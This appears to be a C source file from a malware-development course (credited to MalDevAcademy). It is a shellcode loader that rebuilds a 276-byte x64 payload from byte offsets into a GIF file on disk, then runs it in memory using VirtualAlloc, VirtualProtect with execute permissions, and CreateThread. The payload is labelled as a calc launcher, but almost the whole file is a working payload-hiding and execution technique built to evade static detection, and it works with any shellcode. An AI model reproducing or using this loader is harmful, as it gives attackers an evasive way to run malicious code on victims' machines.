// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

// x64 calc payload
DWORD dwOffsetsArray[276] = {
		
		778, 824, 607, 724, 892, 779, 1036, 12, 12, 12, 551, 602, 551, 453, 556, 602,
		584, 824, 496, 697, 1150, 824, 821, 556, 617, 824, 821, 556, 479, 824, 821, 556,
		503, 824, 821, 629, 453, 824, 405, 710, 429, 429, 498, 496, 863, 824, 496, 1036,
		633, 520, 5, 659, 7, 414, 503, 551, 676, 863, 416, 551, 796, 676, 832, 736,
		556, 551, 602, 824, 821, 556, 503, 821, 561, 520, 824, 796, 1054, 821, 665, 851,
		12, 12, 12, 824, 610, 1036, 1513, 869, 824, 796, 1054, 453, 821, 824, 479, 532,
		821, 573, 503, 1, 796, 1054, 947, 584, 824, 401, 863, 551, 821, 560, 851, 824,
		796, 894, 498, 496, 863, 824, 496, 1036, 633, 551, 676, 863, 416, 551, 796, 676,
		3, 1426, 1145, 742, 550, 795, 550, 457, 474, 572, 4, 1082, 1145, 969, 559, 532,
		821, 573, 457, 1, 796, 1054, 8, 551, 821, 422, 824, 532, 821, 573, 477, 1,
		796, 1054, 551, 821, 802, 851, 824, 796, 1054, 551, 559, 551, 559, 1117, 492, 549,
		551, 559, 551, 492, 551, 549, 824, 607, 874, 503, 551, 556, 401, 1426, 559, 551,
		492, 549, 824, 821, 411, 730, 504, 401, 401, 401, 552, 824, 762, 796, 12, 12,
		12, 12, 12, 12, 12, 824, 619, 619, 796, 796, 12, 12, 551, 762, 496, 821,
		592, 687, 401, 703, 868, 892, 924, 643, 584, 551, 762, 646, 634, 734, 689, 401,
		703, 824, 607, 1031, 478, 520, 1190, 659, 473, 665, 775, 1426, 1145, 403, 868, 0,
		413, 629, 592, 471, 12, 492, 551, 648, 770, 401, 703, 1738, 5, 586, 1738, 443,
		1150, 507, 1150, 12
};


VOID PrintHexArray(IN CONST CHAR* cArrayName, IN PBYTE pBufferData, IN SIZE_T sBufferSize) {

	printf("\nunsigned char %s[%d] = {", cArrayName, (int)sBufferSize);

	for (SIZE_T x = 0; x < sBufferSize; x++) {

		if (x % 16 == 0)
			printf("\n\t");

		if (x == sBufferSize - 1)
			printf("0x%0.2X", pBufferData[x]);
		else
			printf("0x%0.2X, ", pBufferData[x]);
	}

	printf("\n};\n");
}


BOOL ReadFileFromDiskW(IN LPCWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile				= INVALID_HANDLE_VALUE;
	DWORD		dwFileSize			= NULL,
			dwNumberOfBytesRead		= NULL;
	PBYTE		pBaseAddress			= NULL;

	if (!szFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer 	= pBaseAddress;
	*pdwFileSize 	= dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}


BOOL ExecuteShellcodeInLocalProcess(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT OPTIONAL PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PBYTE		pAddress		= NULL;
	DWORD		dwOldProtection		= 0x00;
	HANDLE		hThread			= NULL;

	if (!pShellcodeAddress || !sShellcodeSize)
		return FALSE;

	if (!(pAddress = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pShellcodeAddress, sShellcodeSize);

	if (!(hThread = CreateThread(NULL, 0x00, pAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (ppInjectionAddress)
		*ppInjectionAddress = pAddress;
	if (phThread)
		*phThread = hThread;

	//	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}



#define		DUMMY_FILE		L"C:\\Users\\NULL0x00\\Desktop\\dummygif.gif"


int main() {

	PBYTE		uDummyFileBuffer		= NULL;
	DWORD		dwDummyFileSize			= 0x00;

	PBYTE		pPayloadBuffer			= NULL;
	DWORD		dwPayloadSize			= (sizeof(dwOffsetsArray) / sizeof(DWORD));

	if (!ReadFileFromDiskW(DUMMY_FILE, &uDummyFileBuffer, &dwDummyFileSize))
		return -1;

	if (!(pPayloadBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPayloadSize)))
		return -1;


	for (DWORD i = 0; i < dwPayloadSize; i++){
		pPayloadBuffer[i] = uDummyFileBuffer[dwOffsetsArray[i]];
	}

	//\
	PrintHexArray("x64CalcShellcode", pPayloadBuffer, dwPayloadSize);
	//
	ExecuteShellcodeInLocalProcess(pPayloadBuffer, dwPayloadSize, NULL, NULL);

	Sleep(-1);
}

